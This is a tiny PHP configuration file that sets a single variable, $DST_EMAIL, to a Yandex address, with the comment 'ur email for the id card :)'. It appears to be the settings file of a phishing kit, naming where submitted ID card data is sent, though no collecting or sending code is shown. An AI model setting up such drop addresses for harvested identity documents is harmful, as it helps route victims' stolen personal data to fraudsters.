<?php
//ur email for the id card :) 
$DST_EMAIL="namemand0@yandex.com";

 ?>
